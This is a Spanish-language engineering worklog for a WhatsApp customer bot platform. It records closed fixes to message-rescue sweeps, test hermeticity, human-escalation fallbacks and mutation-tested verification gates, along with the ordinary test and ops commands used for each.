      nada'»*— y no la aplicó al caso en que sí se puede leer. Media familia cubierta se lee como
      familia cubierta.

      **Por qué es demostrable y no una opinión sobre motivos:** `seleccionarHuerfanos` ya probó
      que esa conversación no tiene **ningún** saliente. Entonces una reinyección sin `sent` dejó
      a la persona tan muda como estaba, se llame como se llame el motivo — no hay que enumerar
      motivos malos (lista de inclusión: falla abierto con el motivo nuevo que nadie previó). Se
      enumera la **excusa**, que falla cerrado: `MOTIVOS_SIN_RESCATE_AJENO = {handoff_humano}`,
      donde el bot se calla a propósito y el que espera es de `onia-vigia-sin-respuesta.sh`.

      Reproducción (30 s) · 4 casos nuevos, validados por mutación en las dos direcciones —
      ensanchar la excusa para tapar el tercer estado (el esquive) cae en 3 rojos, vaciarla en 2:

      ```
      cd hermes-content/deploy/vps-ops/bot && node --test rescate-run.test.mjs
      ```

      911/911 en `npm run test:bot`, que es el eslabón de la cadena que recoge ese archivo.

      ⚠️ **COMMITEADO, NO DESPLEGADO.** El cron (`4,14,24,34,44,54 * * * *`) corre la copia de
      `/root/loops/onia-hermes`, no la de `/opt/onia/bot` — así que esto se enciende solo cuando
      el integrador lleve la rama a `main` (ese clon del VPS estaba al día al medirlo). **No
      necesita pedido de deploy.**

      **La mitad que queda abierta, dicha con su nombre:** ahora el fallo se VE en el log y el
      barrido sale con `exit 1`, pero a Sergio Urcullo no le llega. Avisarle en cada vuelta serían
      hasta 72 mensajes por el mismo mensaje (12 h de ventana ÷ 10 min de cron) — exactamente el
      ruido que `t_7362c865` reclama. Falta avisar **una sola vez por mensaje**, y eso pide estado
      durable que hoy el barrido no tiene. Va abajo como ítem propio.

- [x] ✅ **CERRADO el 2026-09-11: la SUITE del bot le mandaba avisos a Sergio Urcullo y dejaba
      marcas en producción. Una de ellas silenciaba el aviso del lead real del 10-sep.**
      Lo causó el ítem de acá abajo, el mismo día.

      **Cómo apareció:** el tablero amaneció con `t_3cd88596` — «🔴 Un mensaje quedo SIN
      contestar · conv 49: espera hace 5 min». Se midió antes de creerle, y era falso en las dos
      mitades: el bot **había contestado los dos** mensajes de la conv 49 (936→937 y 938→939) y
      el barrido real informaba `0 sin respuesta` en **todas** sus corridas de esa hora. La conv
      49 tampoco es un lead: es la sonda de QA del carril.

      El log del enrutador dio la firma exacta — **8 avisos en 50 segundos**, dentro de la vuelta
      anterior de este loop:

      ```
      05:16:01  TAREA t_3cd88596 clave=876bcd  🔴 Un mensaje quedo SIN contestar
      05:16:09  TAREA-YA-EXISTE clave=876bcd   (y 6 más hasta 05:16:51)
      ```

      **La causa:** los casos que llamaban a `runRescateSweep` con `emitir: true` **no
      inyectaban** `deps.avisar` ni `deps.marcas`, y los defaults son los REALES — `onia-tg.sh`
      y `/var/lib/onia-rescate-avisado/`. Se estimaron 3 casos; la baranda encontró **12**.

      **Lo caro no fue el aviso falso, fue la MARCA.** Quedaron en disco `chatwoot-49-282`,
      `chatwoot-47-249` y **`chatwoot-11-873`** — el lead real del 10-sep que motivó todo el
      ítem de abajo. Esa marca existe para no repetir un aviso ya entregado: con ella puesta, el
      día que ese mensaje vuelva a quedar huérfano **el aviso no sale**. El instrumento que
      existe para no perder un lead lo silenciaba su propio test, en verde y sin una línea.
      Liberadas las 6 al cerrar (`ls -A` → 0); soltar una marca sólo puede causar un aviso de
      más, nunca de menos.

      **Un caso pasaba en verde por una razón falsa, y lo destapó el directorio limpio.**
      «avisa SOLO cuando salvó a alguien» afirmaba `deepEqual(avisos, [])`, y eso era cierto
      únicamente porque su **corrida anterior** había dejado `chatwoot-47-249` en producción:
      la reserva devolvía `false` y el 🔴 no salía. Con marcas propias muestra la verdad — un
      reinyectado deduplicado **sí** avisa de perdido, que es deliberado. Ahora mira el aviso de
      rescate (🛟), no la bandeja entera.

      **El arreglo va en el producto y TIRA, no no-opera:** `guardaDeEfectoReal(que)` explota si
      `NODE_TEST_CONTEXT` está definido —lo pone el runner de Node y nadie más: `"child-v8"`
      adentro, `undefined` afuera—. Un no-op silencioso dejaría en verde a un caso que cree
      estar probando el aviso, que es el guardia hueco de siempre. Falla **cerrado**: un caso
      futuro con `emitir: true` que no inyecte explota solo y nombrando lo que le falta, así que
      **no hace falta además un gate que parsee el archivo de tests** buscando la forma del
      descuido — enumerar formas es una lista de inclusión y se le escapa la siguiente.

      ⚠️ **El `catch` del aviso se tragaba la baranda**, y ahí fallaba ABIERTA justo en el
      caso que viene a cuidar: el aviso quedaba silenciado y el test pasaba en verde creyendo
      que lo probó. El error va marcado (`.hermetismo`) y el catch lo re-tira. Ese catch existe
      para que un Telegram caído no tumbe un rescate ya hecho — un fallo de red se aguanta, un
      test escrito mal no. **Con eso aparecieron 3 casos más** que estaban mudos.

      ⚠️ **Una baranda anti-efecto es el único gate que NO se valida quitándole la protección.**
      Corrí esa mutación creyéndola segura y **mandó un aviso real** (05:47:39). Lo contuvo de
      casualidad la dedup del enrutador, que ya tenía la clave. Queda escrito arriba de los
      casos cuál no se corre y cuál es la equivalente segura (tragar el `.hermetismo`, que
      prueba lo mismo sin desarmar nada). Las otras 4 mutaciones caen en rojo, cada una en su
      caso, y ninguna ejecuta el efecto.

      ```
      cd hermes-content/deploy/vps-ops/bot && node --test rescate-run.test.mjs   # 51/51
      npm run test:bot                                                          # 926/926
      npm test                                                                  # cadena, exit 0
      node rescate-run.mjs                                                       # seco: 0 huérfanos
      ```

      ⚠️ **COMMITEADO, NO DESPLEGADO — y no necesita pedido de deploy**, por lo mismo que el
      ítem de abajo: el daño lo causa la **suite**, que corre desde el repo. Se apaga solo
      cuando el integrador lleve la rama a `main`.

- [x] ✅ **CERRADO el 2026-09-11: el rescate fallido se veía en un log que nadie mira. Ahora
      sale, y sale UNA sola vez por mensaje.** Era la mitad que dejó abierta `7a9e10c0`.

      El barrido ya salía con `exit 1` cuando reinyectaba y el bot no emitía nada — pero eso
      vive en `/var/log/onia-rescate-mensaje-perdido.log`. El «hola» del 10-sep (conv 11 msg
      873, inbox 5) falló cuatro veces ahí adentro y dejó de figurar como huérfano **porque la
      persona volvió a escribir sola**, no porque alguien la atendiera.

      **Por qué no alcanzaba con avisar y ya:** la ventana del huérfano es `MAX_EDAD_MS` = 12 h
      y el cron corre cada 10 min → hasta **72 avisos idénticos por el mismo lead**. Eso no es
      avisar de más, es apagar el canal — el vigía que grita mal no molesta, inutiliza. Así que
      el aviso necesitaba memoria por mensaje, durable entre corridas.

      **Se midió primero si servía `bot_messages.message_key`, como pedía el ítem, y NO sirve.**
      Dos razones independientes, medidas contra `supabase-db`, no supuestas:

      | | por qué descarta la tabla |
      |---|---|
      | **FK** | `bot_messages.conversation_key` → `bot_conversations`. El insert falla justo cuando el webhook nunca creó la conversación (401, puerto muerto, 500) — **el peor modo de falla es el que no se puede recordar**, y el aviso volvería cada 10 min |
      | **Contabilidad** | `direction` sólo acepta `inbound\|outbound` (CHECK) y `usage-run.mjs` cuenta `direction=eq.outbound` para el uso que se le **cobra** al cliente. Una marca ahí es una conversación facturada que nunca existió |

      Va entonces un archivo por mensaje en `/var/lib/onia-rescate-avisado/` — mismo patrón que
      `/var/lib/onia-vigia-remotos/<id>`, que ya es el de la casa. La reserva es atómica (`wx`
      falla con `EEXIST`), así que dos barridos simultáneos no avisan los dos, y se reserva
      **antes** de mandar, igual que el recordatorio M9.

      Las cuatro decisiones que no son obvias, con su motivo:

      - **La marca es por MENSAJE**, no por conversación ni por vuelta: dos mensajes perdidos de
        la misma persona son dos leads.
      - **«No pude recordar» (`null`) no es «ya avisé» (`false`)**: si la marca no se puede
        reservar **no se manda**, porque 72 idénticos es peor que el log. Se dice aparte
        (`marcasFallidas`, línea `SIN MARCA` en el log) en vez de tragarse.
      - **Si Telegram se cae, la marca se SUELTA.** La reserva existe para no repetir un aviso
        *entregado*; si no se entregó, ese lead no se anunció nunca y el barrido siguiente
        reintenta.
      - **Dos avisos separados, no uno mezclado.** `onia-tg.sh` clasifica por la **primera
        línea**: un mensaje que empiece con 🛟 y remate con un fallo se rutea como buena noticia
        y el lead perdido no le llega a nadie.

      Y una purga: `VIDA_MARCA_MS` = 2 × la ventana del huérfano. Sin ella el directorio crece
      para siempre; con ella una marca vencida no puede silenciar nada, porque pasada la ventana
      ese mensaje ya no es huérfano.

      **11 casos nuevos, validados por MUTACIÓN en 9 direcciones** (sin reserva · marca por
      conversación · tratar `null` como avisar · un solo mensaje mezclado · sin escapar HTML ·
      marcar también en seco · no soltar la marca · sin purga · el **esquive**: reservar y no
      armar nunca el aviso). Las 9 caen en rojo.

      ⚠️ **La primera versión del caso «en seco» pasaba VERDE con el guardia arrancado** —
      lo tapaba que en modo seco `fallidos` está vacío, así que había dos guardias atajando el
      mismo caso. Reescrito sobre lo único que ese guardia protege de verdad: `purgar` **BORRA**
      archivos, y un `node rescate-run.mjs` sin `--emit` —lo que uno tipea para mirar— no puede
      pasar la escoba por las marcas de producción.

      ```
      cd hermes-content/deploy/vps-ops/bot && node --test rescate-run.test.mjs   # 47/47
      npm run test:bot                                                          # 922/922
      node rescate-run.mjs                                                       # seco, contra prod
      ```

      Seco contra producción al cerrar: `0 sin respuesta · 0 reinyectados · 0 CONTESTADOS` — hoy
      no hay ningún huérfano, el circuito está sano.

      ⚠️ **COMMITEADO, NO DESPLEGADO — y NO necesita pedido de deploy.** El cron
      (`4,14,24,34,44,54 * * * *`) corre la copia de `/root/loops/onia-hermes`, no la de
      `/opt/onia/bot`: esto se enciende solo cuando el integrador lleve la rama a `main`.

- [x] ✅ **CERRADO el 2026-09-10 (`31cdfba`): quien pedía hablar con una PERSONA recibía siempre
      «Te conecto con un agente, en unos momentos te atenderán» — y cuando la conversación no
      llegaba a ninguna bandeja, el bot además se callaba. Sin bot y sin humano, con la promesa
      hecha.**

      Escalar son **dos** cosas, y las dos se hacían pasara lo que pasara del otro lado: dejar la
      sesión en `ESCALATED` —que silencia al bot (`// While escalated, messages go to human agent
      — no bot reply; return`)— y prometer que lo esperan. Si `chatwootConvId` quedaba `null`, esa
      persona quedaba en un limbo: el único que estaba contestando enmudecía, nadie sabía que
      existía, y la única salida era que adivinara escribir *bot*.

      **Se cae por DOS caminos y los dos estaban vivos** (medido el 2026-09-10 contra
      `supabase-db`, no heredado):

      | org | rubro | `addon.whatsapp` | inbox web | inbox WhatsApp |
      |---|---|---|---|---|
      | `clinica-sergio-p2ljs` | dental | **active** | — | — |
      | `zz-qa-ferreteria-tornillo-ommbt` | comercio | **active** | — | — |
      | `zz-qa-clinica-chatbot-9k651` | dental | active | 7 | — (cae al 7 por el fallback) |
      | `onia-interna` | interna | active | 4 | 5 |

      **2 de las 4 orgs con la capacidad activa no tienen bandeja de WhatsApp, y una es una
      clínica real, no QA.** Ahí `inboxesDeLaOrg().whatsapp` es `null`, así que ni siquiera se
      entra al `try`: es una **ausencia**, no un error que registrar. El otro camino era el
      `catch {}` vacío de Chatwoot, cuyo comentario —*«Chatwoot unavailable — still show
      message»*— **declaraba la decisión, y por eso nadie la auditaba**.

      **Por qué ningún gate podía verlo:** no sobra ni falta una palabra (el texto es legítimo
      cuando la conversación SÍ se creó), no es un defecto de rubro, y la superficie es WhatsApp,
      así que no hay pantalla que mirar ni HTML que grepear. **El sujeto no es el texto: es el par
      (hubo bandeja, qué se le dice).** Es la mitad opuesta de la lectura que falla muda que se
      cerró el 09-sep en `/appointments`: acá es una **escritura que falla muda y encima PROMETE
      que ocurrió**.

      **Y lo que lo hacía parecer cubierto:** el patrón de degradación honesta ya estaba **dos
      funciones más arriba en el mismo archivo** —cuando la IA falla se llama `notifyBotError` y
      el texto cae al teléfono del negocio—, y el correo de aviso hasta lo dice: *«el paciente
      recibió un mensaje de fallback con el teléfono. No quedó sin respuesta»*. El archivo ya
      sabía hacerlo bien; justo la rama más cara —una persona pidiendo una persona— no lo hacía.

      **Arreglo** (`lib/whatsapp/escalacion-a-humano.ts`, puro, sin base ni red), condicionando la
      promesa en vez de borrarla:
      · **no se silencia al bot** sin bandeja — `ESCALATED` sin conversación no manda los mensajes
        a ningún lado, sólo deja mudo al único que estaba contestando, así que queda en `MENU`;
      · el texto degradado da un **camino real** (el teléfono del negocio) y es **neutro entre
        rubros**; sin teléfono cargado no inventa uno ni deja al cliente sin salida;
      · **`notifyEscalationFailed`** avisa al dueño, que es el único que puede rescatar a esa
        persona, y va **aparte** de `notifyBotError` a propósito: acá el bot SÍ respondió, y
        reusar aquel texto («El bot no pudo responder al mensaje») mandaría a revisar la IA
        —que está sana— en vez del inbox, que es lo que hay que tocar.

      **Gate:** `lib/whatsapp/escalacion-a-humano.test.ts` (13 casos), con el caso que mira al
      **LLAMADOR** sobre el fuente **sin comentarios** —una bitácora no puede absolver a un gate—.
      Validado **por mutación en 4 direcciones**: vuelve a prometer · silencia al bot · no avisa ·
      **esquive** (el llamador importa el módulo y conserva su propio texto). Las 4 `exit 1`, base
      y restaurado `exit 0`, y cada mutación verificada de que entró.
      **Gates:** `npx tsc --noEmit` 0 · `npx vitest run` **4262 pasan / 341 archivos** ·
      `npx eslint .` 0 errores.

      ✅ **VIVO en producción — verificado el 2026-09-10 22:46 La Paz con las TRES medidas.**
      El texto anterior decía *"`31cdfba` está en la rama del carril, no en `master`; falta el
      merge y después el swap"*, y las tres dan verde:
      `git merge-base --is-ancestor 31cdfba origin/master` → **sí**;
      `docker exec onia-platform cat /app/.next/BUILD_ID` → `w_JrYQKMrWy8GyDuBNnOk` (corre);
      `docker exec onia-platform grep -rl decidirEscalacion /app/.next/server` → devuelve un
      chunk del servidor (una línea, no vacío). El que pide un humano ya no recibe
      *"te conecto con un agente"* cuando no hay inbox del otro lado.

- [x] ✅ **CERRADO el 2026-09-08: el bot de WhatsApp del cliente le pedía su catálogo a una tabla
      que está VACÍA por construcción en 3 de los 5 rubros de la v1.0.**

      El add-on de Bs 390/mes armaba el contexto de la IA con `prisma.treatment.findMany`
      **siempre**. `treatments` sólo la llenan los packs clínicos: comercio, importadora y
      servicios profesionales cargan lo que venden en `/comercio`
      (`onia_commerce_products`). Como `buildSystemPrompt` omite la sección
      «SERVICIOS DISPONIBLES» cuando la lista viene vacía, **el bot de una ferretería con su
      catálogo cargado contestaba sin saber que existía**.

      Medido en producción, no supuesto:

      ```
      docker exec supabase-db psql -U postgres -d postgres -tAF'|' -c "
        select o.slug, o.\"verticalTrackId\",
          (select count(*) from public.treatments t where t.\"organizationId\"=o.id and t.active),
          (select count(*) from public.onia_commerce_products p where p.\"organizationId\"=o.id and p.active)
        from public.organizations o;"
      → zz-qa-ferreteria-tornillo-ommbt|gestios-general|0|1
      ```

      **Por qué ningún gate podía verlo**, que es lo que lo mantuvo vivo: `[]` es un valor
      válido que no lanza; no sobra ni falta una palabra (el barrido de rubro × texto de este
      bot vigila el VOCABULARIO, y derivaba bien); y la superficie es WhatsApp, así que no hay
      pantalla que mirar ni HTML que grepear. **El defecto no estaba en el texto sino en DE QUÉ
      TABLA sale el dato** — la instancia hermana de la que `contarClientesDelRubro` ya mató en
      el contador de clientes. Peor: el comentario de `opcionesDelMenu` ya prometía que a los
      rubros sin agenda «todo lo demás lo contesta la IA con el catálogo del negocio», y ese
      catálogo nunca llegaba.

      **Arreglado:** `12bdb28` — `catalogoEnTratamientos()` (derivado del nav, como sus
      hermanas) + `lib/whatsapp/catalogo-del-negocio.ts`. No se reusó `fichaClinica` (pregunta
      por la FICHA) ni `llevaInventario` (pregunta por STOCK, y servicios profesionales
      contesta distinto a las dos). El gate deriva sujetos de `VERTICAL_PACKS`, **mira al
      llamador** y se mide sobre el fuente sin comentarios; validado por mutación en 3
      direcciones (5 rojos / 2 rojos / 2 rojos). Gates: tsc 0 · eslint 0 · vitest 3926.

      ⚠️ **En la rama del carril, NO en `master`:** `git merge-base --is-ancestor 12bdb28
      origin/master` dice que no. Falta el merge del integrador y después el deploy
      (`t_bf1607af`) — **no está en producción**.

- [x] ✅ **CERRADO el 2026-09-08 (`af777cd`). HERMANO del anterior, en la MISMA expresión: el bot
      no reconocía al cliente que le escribe si su rubro guarda la gente en otra tabla.**

      **La cola decía «1 uso» y eran TRES.** El grep de la reproducción de acá abajo devuelve
      `254`, `306` y `345`. Los dos que fallaban sólo querían el NOMBRE:

      | uso | qué hacía mal | costo |
      |---|---|---|
      | 254 · saludo a la IA | `patientName: patient?.name ?? v.cliente` | saluda sin nombre — suave, es lo que decía la cola |
      | 345 · `escalateToHuman` | `patientName = patient?.name ?? phoneNumber` | **la conversación aterriza en la bandeja del dueño rotulada con un número de teléfono** |
      | 306 · `getNextAppointment` | nada: necesita el `id` para buscar la cita | queda como estaba, a propósito |

      El de la escalación es el que valía la vuelta: esa bandeja es la superficie del objetivo de
      este carril, y el negocio ve un número por un cliente que él mismo cargó.

      **Arreglo:** `lib/whatsapp/cliente-del-negocio.ts` — hermano exacto de
      `catalogo-del-negocio.ts`, base inyectada sin default. Busca en `patients` o en
      `onia_core_business_partners` según `guardaClientesEnPatients(trackId)`, por
      `metadata.phone` —la MISMA clave que escriben `lib/comercio/clientes.ts` y
      `lib/comercio/ventas.ts`, con otra no encontraría nunca a nadie— y cortando por
      `partnerType startsWith "cliente"`, porque los proveedores viven en esa tabla: sin ese
      corte el bot saludaría al ferretero por el nombre de quien le VENDE. `trackId` pasó a ser
      parámetro **obligatorio** de `escalateToHuman`; con default, un llamador que no lo pase es
      indistinguible de uno correcto y `tsc` no lo ve.

      **La premisa que deja sano al uso 306, anclada con un caso** en vez de con la suerte: hoy
      todo rubro con agenda guarda en `patients` (medido sobre los 8 packs: `agenda ⟺ patients`).
      Es una coincidencia del nav, no una ley — el día que un rubro tenga agenda y guarde en
      partners, ese camino queda roto y el gate lo dice.

      **Gate validado por mutación en 6 direcciones, las 6 en rojo**, incluida la de ESQUIVE
      (llamar al helper y tirar el resultado, que es como este tipo de guard pasa en verde hueco).
      `npx tsc --noEmit` exit 0 · `npx vitest run` **3948 pasan / 323 archivos** · `npx eslint .`
      0 errores — corridos en el worktree del VPS, sobre el árbol que aterrizó.

      ⚠️ **Commiteado y pusheado, NO desplegado.** Falta el merge del integrador a `master` y
      después el swap; viaja en el pedido de deploy de plataforma que espera el `ok` de Sergio
      Urcullo.

      <details><summary>El ítem como estaba escrito</summary>

      Dos líneas más arriba del catálogo, `lib/whatsapp-bot.ts` hace
      `prisma.patient.findFirst({ where: { organizationId, phone: { contains: ... } } })`.
      Comercio e importadora guardan a sus clientes en `onia_core_business_partners`
      (`guardaClientesEnPatients()` da `false`), así que ahí **siempre** cae al genérico.

      **Por qué NO se arregló en la misma vuelta, y no es pereza:** el teléfono de un business
      partner no es una columna, vive dentro de `metadata` (JSON) — el modelo lo dice:
      `primaryContactId String? // referencia suave (telefono/email en metadata)`. Buscar por
      teléfono ahí es otra consulta y otra decisión (¿índice?, ¿qué clave dentro del JSON?),
      no un renglón que se cuela en un arreglo de catálogo.

      **Impacto real, para no inflarlo:** el fallback es `v.cliente`, que ya deriva del rubro
      («cliente»), así que el bot **no miente** — sólo saluda sin nombre a alguien que el
      negocio sí tiene cargado. Es peor en comercio, donde el cliente fiado es conocido.

      **Reproducción:** `grep -n "prisma.patient.findFirst" lib/whatsapp-bot.ts` (1 uso, en el
      camino de texto libre) y `lib/plan-limits.ts:190` `contarClientesDelRubro`, que ya
      resuelve la MISMA pregunta bien y es el patrón a copiar.

      </details>

- [x] ✅ **CERRADO el 2026-09-08: el arreglo de ayer se aplicó a UNA instancia y sus tres hermanas
      quedaron ciegas — de los gates vivos de este carril, TRES no medían nada desde nodo-casa.**

      Ayer se arregló `avisos-vivo.mjs` (el ítem de acá abajo) trayéndose el artefacto del VPS por
      SSH cuando `/opt/onia/bot` no está en el disco. **Ese arreglo no subió a la plantilla**, así
      que hoy, corriendo los aliases vivos uno por uno desde casa, salieron tres en `NO MEDIDO` y
      **los tres por lo mismo**: leen `/opt` del disco local.

      | alias | qué decía | qué lee |
      |---|---|---|
      | `addon:canal-vivo` | «no pude leer las orgs de la base o el codigo del build vivo» | `/opt/onia-platform/build-*/` |
      | `recordatorio:vivo` | «no pude leer /opt/onia-platform/app.env» | `/opt/onia-platform/app.env` |
      | `deploy:plataforma-vivo` | «BUILD_ID vivo sin par en disco» | `/opt/onia-platform/build-*/` — **de `onia-cola`**, va en `t_5245e456` |

      **Por qué nadie lo vio, que es lo que importa:** ninguno falla en verde. Los tres salen con
      **exit 2** y dicen honestamente que no midieron — y por eso mismo no rompen nada, nadie los
      mira, y la línea `OBJETIVO:` del carril se sigue firmando con las OTRAS cifras, que seguían
      en meta. Es la misma forma que ya tiene esta memoria para `objetivo_visible.mjs`, pero
      multiplicada: **el instrumento no miente, se calla, y callarse no deja rastro.**

      **Y lo que lo disfrazaba:** la mitad BARATA de cada medición sí contestaba. `docker exec`
      funciona desde casa porque es un shim que delega en el VPS, así que `addon:canal-vivo` leía
      las orgs perfecto y se moría en el build. Un gate que contesta a medias se lee como un gate
      que anda.

      **Arreglo, en la plantilla y no en cada instancia:** `scripts/lib/vps-o-local.mjs` —
      `leerDeProduccion(ruta)` y `listarDeProduccion(patrón)` preguntan al disco local y, si no
      contesta, al VPS por SSH (`BatchMode`, sin colgarse pidiendo contraseña). Todo **tri-estado**:
      `null` es «no pude preguntar» y nunca cadena vacía, porque un gate que recibe `""` no puede
      distinguirlo de «lo medí y está vacío» — ahí es donde un `NO MEDIDO` se vuelve un falso
      verde. Las dos vías se inyectan, así se valida por mutación sin tocar producción.

      **Verificado en las DOS direcciones, que es la que importa:**

      - `npm run addon:canal-vivo` → **exit 0**, `OK: el build vivo (3d1dabb) lee la capacidad y
        ninguna org diverge`. Cruzado a mano antes de tocar el gate (BUILD_ID vivo
        `J4LFta9YhYnlO3QAbJJZ8` → `build-3d1dabb` por SSH; `git show 3d1dabb:<ruta>` da 4 y 3 usos
        de `isWhatsAppAddonActive` en las dos rutas): **el instrumento reparado y la medición
        manual coinciden**, así que el defecto que vigila NO está vivo.
      - `ONIA_VPS_SSH=root@203.0.113.9 npm run addon:canal-vivo` → **exit 2, `NO MEDIDO`**. Con el
        VPS inalcanzable no puede salir «OK»: eso es lo único que hace que el verde signifique algo.
      - `npm run recordatorio:vivo` → **exit 0** y, por primera vez desde casa, **entregó un
        recordatorio real**: `status=sent (250 2.0.0 OK)`, `dsn=2.0.0`, `delay=1.3`, con su marca
        `reminder24hSentAt` en la base. Con el SSH roto → `NO MEDIDO`.

      **Anclado:** `scripts/lib/vps-o-local.test.mjs`, 7 casos, cableado a la cadena como
      `test:vps-o-local` (un gate que no se declara en `package.json` le es invisible a
      `guards-cableados`). Cada caso está escrito para que **ningún otro caso pueda taparlo** —
      dos guardias hermanos que atajan el mismo escenario dan verde con uno roto, y eso ya pasó
      acá. Validado por mutación, confirmando cada una por su línea `fail N` explícita y grepeando
      que la mutación entró: `""` tratado como falsy → rojo; `null` devuelto como `""` → rojo;
      lista vacía del VPS confundida con «no pude preguntar» → rojo. Las tres dieron
      **`pass 6 · fail 1`**, o sea que cada guardia lo ve exactamente un caso. Cadena entera de
      `onia-hermes`: **53 eslabones, EXIT 0**.

      ⚠️ **Al mergear, `package.json` se resuelve por UNIÓN.** Esta rama suma un eslabón a la
      cadena `test`; elegir un lado borra el gate del otro carril y su archivo de test entra igual
      por su propio hunk, así que queda huérfano y `guards-cableados` pasa en verde.

- [x] ✅ **CERRADO el 2026-09-07: el gate de los avisos medía HANDOFF y daba por medida la DEMO —
      la rama que lleva la plata.** El objetivo del carril dice «cada demo agendada **o** handoff le
      llega a Sergio», y `avisos-vivo.mjs` manejaba el motor sólo hasta un pedido de humano. Su
      propio encabezado lo declaraba (*«ante un pedido de humano»*), y aun así el veredicto se
      leía como si cubriera las dos.

      **Probado por MUTACIÓN antes de tocar nada, no por lectura:** borrando entero el
      `notify_sergio` de la rama de agendar (`bot-engine.mjs`, el bloque `kind: "demo_agendada"`),
      el gate viejo seguía dando **VERDE** — `{emite:true, accionable:true}`. O sea: el día que se
      rompa el aviso de la demo, el único instrumento que mira este objetivo dice `circuito: ok`,
      **ningún número se mueve**, y cada prospecto que YA eligió horario se pierde en silencio.

      **Por qué probar una no dice nada de la otra:** son hermanas emitidas desde funciones
      DISTINTAS del motor (`bot-engine.mjs:341` el handoff, `:729` la demo) y con payloads de
      forma distinta — el handoff trae `reason`, la demo no. Es la misma familia de fallo que las
      dos bienvenidas hermanas del 2026-09-04: se arregla una y la otra queda.

      **Y la trampa que lo mantenía invisible:** `DEFAULT_CONFIG` trae los horarios en
      `pending: true` (placeholders), así que elegir «A» cae en *«no tengo horarios libres»* y
      **nunca** llega a agendar. Producción los carga de `ONIA_BOT_SLOTS`. El gate ahora inyecta
      dos horarios reales y futuros, así la rama se maneja siempre — incluso el día que el
      renovador no haya corrido.

      **Arreglo:** `RAMAS_QUE_AVISAN = ["handoff", "demo_agendada"]` en `avisos-vivo.mjs`;
      `motorProduceAviso()` recorre las dos, exige el `kind` esperado (no «algún notify»:
      un `sin_horarios` en vez de la demo también es empalme roto), y `emite`/`accionable` son la
      Y de todas. Una rama que no se puede manejar es **ROJO, nunca un salteo**. La salida nombra
      cada rama SIEMPRE, no sólo cuando falla: un `motorEmiteNotify ok` sin decir sobre qué ramas
      es justo la lectura que dejó pasar esto.

      **Verificado en las dos direcciones contra el bot DESPLEGADO** (no contra el repo):
      `npm run avisos:vivo` → exit 0 con `ok rama handoff` y `ok rama demo_agendada`; con el aviso
      de la demo borrado → `demo_agendada {emite:false}` y el circuito entero en rojo **mientras el
      handoff sigue verde**, que es el caso que ningún otro guardia puede ver. Anclado con 3 casos
      en `avisos-vivo.test.mjs` (la mutación quedó permanente, con `assert.match` sobre el ancla
      para que avise si cambia la forma). Suite del bot **877/877**, herméticos.

      ⚠️ **De paso, un comentario vencido que empujaba en la dirección contraria:**
      `aviso-telegram.mjs` decía *«APAGADO POR DEFECTO... una decisión de Sergio que está
      preguntada y sin contestar»*. Sergio Urcullo la contestó el **2026-09-03** (opción **c**:
      Telegram ya, Cal.com «cuando moleste anotar a mano») y desde entonces el default va en ON —
      medido hoy en el proceso vivo: `ONIA_BOT_TG_AVISO=true` en `/proc/<pid>/environ` dentro de
      `onia-center`. Un comentario que dice «esto está apagado esperando una decisión» hace que el
      próximo lector lo deje apagado, que es exactamente cómo nació el bug que ese archivo vino a
      arreglar.

- [x] ✅ **CERRADO el 2026-09-07: el tercer número del objetivo (`avisos demo/handoff`) volvió a
      medirse desde nodo-casa.** Medido, no leído: `npm run avisos:vivo` → **exit 0**, `circuito:
      medido` con los cuatro eslabones en `ok` (`flagEncendido`, `credencialesOk`,
      `motorEmiteNotify`, `textoAccionable`), en 12 s. El número dejó de ser `no_medido` y pasó a
      leerse entero: **circuito sano · 0 eventos** = nadie pidió un humano todavía, que es la
      lectura correcta y la que el gate existe para permitir.

      **Arreglo:** `resolverBotDesplegado()` en `avisos-vivo.mjs`, con dos escalones. Si
      `/opt/onia/bot` está en el disco (el VPS) se usa y **no se sale a la red**; si no está
      (nodo-casa) se trae el artefacto del VPS por `ssh tar -cf -` a un temporal y se importa de
      ahí. **No hay un tercer escalón que apunte al repo a propósito:** sería más fácil y
      rompería lo único que este gate prueba — que las piezas que CORREN encajan entre sí.
      `lineasDelLog()` sirve igual desde la copia porque su `logs` es un `docker exec`, y en
      nodo-casa `docker` es un shim que delega en el VPS.

      **Las dos direcciones, en el script real y no sólo en los tests:** con `ssh` funcionando →
      `ok` / exit 0. Con un `ssh` falso que sale 255 al frente del `PATH` → `VEREDICTO: no_medido`
      / **exit 2**, nunca `ok`. Suite del bot **874/874**.

      ⚠️ **Dos guardias míos nacieron huecos y los cazó la MUTACIÓN, no la lectura** — el mismo
      método que salvó al simulador ayer, y la razón de escribirlo acá:

      1. **El chequeo del estado del `ssh` no lo sostenía ningún caso.** Quitándolo, los 12 tests
         seguían verdes: con el VPS caído el destino queda vacío, así que la verificación del
         artefacto ya lo tapaba. Lo que sólo ve el estado es la **transferencia cortada a la
         mitad** — `tar` extrae lo que llegó, `bot-engine.mjs` puede estar y `config.mjs` no, y el
         gate importaría un árbol truncado que falla *como si el bot estuviera roto*. Ése es el
         caso que ahora lo sostiene.
      2. **El espía devolvía un solo estado para todos los comandos**, así que el `tar` tapaba al
         `ssh` y el caso pasaba por el motivo equivocado. Ahora el estado se da **por comando**.

      Matriz final: rompiendo el guardia del artefacto, el del estado del `ssh` o el de la
      hermeticidad, cada uno da **1 caso en rojo**; sin mutación, los **12 en verde**.

      ⚠️ **Y una fuga que el test se hacía a sí mismo:** el caso feliz devuelve un temporal real y
      el que limpia es `medir()`, así que cada corrida de la suite dejaba un directorio en `/tmp`
      — que en WSL es un **tmpfs que vive en RAM**. Había 24 acumulados. El test ahora limpia el
      suyo; los caminos que fallan ya se limpiaban solos. Verificado: 0 después de correr.

- [x] ✅ **CERRADO el 2026-09-07: el «3 de 3» de este carril volvió a certificar un guion que ningún
      lead ve — el mismo falso verde del 2026-09-04, resucitado por la mudanza de máquina.**
      Medido al arrancar la vuelta, no leído: el simulador contestaba
      *«Justo ahora no tengo horarios libres para ofrecerte»* (`M0_SIN_HORARIOS`) mientras
      producción tenía **dos** horarios cargados — `ssh root@187.77.16.63 'grep ONIA_BOT_SLOTS
      /opt/onia/bot/webhook.env'` → *«martes 8 de septiembre, 14:00@… | miércoles 9…»*.

      **La causa es de clase, no de código:** el escalón que arregló esto el 2026-09-04 leía la
      ruta absoluta `/opt/onia/bot/webhook.env`. El 2026-09-06 el carril se mudó a **nodo-casa**
      (WSL), donde `/opt/onia/bot` **no existe** — así que el instrumento dejó de medir y el
      número siguió saliendo verde. Es el ya conocido *«un gate atado a una ruta del VPS deja de
      medir cuando su loop se muda»*; acá le tocó al instrumento que produce la cifra del carril.
